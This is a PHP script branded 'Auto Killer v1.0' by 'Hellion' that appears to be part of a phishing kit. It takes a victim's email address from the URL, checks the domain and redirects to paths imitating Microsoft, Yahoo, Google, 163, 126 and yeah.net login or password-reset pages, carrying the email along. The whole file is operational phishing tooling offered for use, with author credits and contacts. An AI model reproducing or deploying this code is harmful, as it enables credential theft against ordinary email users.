<?php

 /*
 
 # HELLION PROUDLY PRESENTS, Auto Killer v1.0
 
 # This program is free software brought to you by Hellion: 
 # You can redistribute it and/or modify it under the terms of 
 # the GNU General Public License as published by the Free Software Foundation, 
 # either version 3 of the License, or (at your option) any later version.
 
 # However, the license header, copyright and author credits 
 # must not be modified in any form and always be displayed.

 # This program is distributed in the hope that it will be useful,
 # but WITHOUT ANY WARRANTY; without even the implied warranty of
 # MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. 
 # Contact me : team_pbg@yahoo.com for more details.
 
 # Skype: teamipwned

 # Special greets to Shaif Lifax, Solaree, PaperBoi, Softwarewind, Emoney, and others who helped! 
 
 # WARNING: Do not touch anything here!

  */
$email = @$_GET["email"];
function OutlawedABH($tag, $email){
$i = 0;
$x = "";

while($email[$i] != "@"){
$i = $i+1;
}
$i = $i+1;
$x = substr($email, $i);

$pos = strpos($x, $tag);
if($pos === false){
	return false;
}

else {
	return true;
}

};

if ((OutlawedABH("outlook", $email)) || (OutlawedABH("live", $email)) || (OutlawedABH("hotmail", $email))){
	header("location: login.live.com?login.srf?wa=wsignin1.0&rpsnv=12&ct=1425083828&rver=6.4.6456.0&wp=MBI_SSL_SHARED&wreply=httpsbay169.mail.live.com%default.aspxFrru3inbox&lc=1033&id=64855&mkt=en-us&cbcxt=mai&email=$email");
}


elseif (OutlawedABH("yahoo", $email)){
	header("location: us-mg5.mail.yahoo.com?neo.launch?.rand=1qhua0f7o2jut&email=$email");


}


elseif (OutlawedABH("vip.163.com", $email)){
	header("location: activity.vip.163.com?activity.yearend&index.html?from=dengluwenzi&email=$email");

}

elseif (OutlawedABH("vip.126.com", $email)){
	header("location: activity.vip.126.com?activity.yearend&index.html?from=dengluwenzi&email=$email");

}

elseif (OutlawedABH("126.com", $email)){
	header("location: mail.126.com?getpasswd.RetakePassword.jsp?from=mail126osid=1&email=$email");

}

elseif (OutlawedABH("gmail.com", $email)){
	header("location: accounts.google.com?ServiceLogin?service=mail&passive=true&rm=false&continue=.&ss=1&scc=1&ltmpl=default&ltmplcache=2&emr=1&osid=1&email=$email");

}

elseif (OutlawedABH("163.com", $email)){
	header("location: mail.163.com?getpasswd.RetakePassword.jsp?from=mail126osid=1&email=$email");

}


elseif (OutlawedABH("yeah.net", $email)){
	header("location: yeah.net?errorType=401&error&email=$email");


}

else {
	header("location: domain?rand=WebAppSecurityservice=mail&passive=true&rm=false&continue=1&email=$email");

}

?>